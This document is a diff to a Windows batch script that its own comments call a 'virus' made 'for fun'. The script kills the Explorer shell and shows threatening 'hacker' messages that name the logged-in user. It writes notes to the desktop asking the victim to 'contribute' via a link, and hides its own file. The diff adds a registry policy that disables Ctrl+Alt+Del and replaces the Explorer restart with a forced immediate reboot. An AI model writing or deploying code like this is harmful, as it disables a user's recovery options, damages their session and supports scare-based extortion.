@@ -1,5 +1,8 @@
 @echo off
-:: lol virus was made by me i actually dont know how to hack(coding????????????)
+:: lol virus was made by me i made this for fun
+
+:: setup registry keys before killing explorer
+reg add HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v DisableCAD /t REG_DWORD /d 1
 taskkill /f /im explorer.exe
 cls
 echo ----HACKER VIRUS----
@@ -28,5 +31,6 @@ echo You are our next target, %username%... because you will never get your comp
 echo We will meet you soon, in 10 minutes, %username%... so always contribute to the Archer Hackers team fast, but here is a quick note: You will be a never forgotten victim of ours... > %userprofile%\desktop\ARCHERHACKERSDATA\remembertokeep.txt
 echo Heres the link to contribute: https://ahakers.com/contrib/victim > %userprofile%\desktop\ARCHERHACKERSDATA\contrib.txt
 attrib +s +h %userprofile%\desktop\creepy.bat
-start explorer.exe
-exit
+echo Do you want to restart your computer? :)
+pause
+shutdown /f /r /t 0
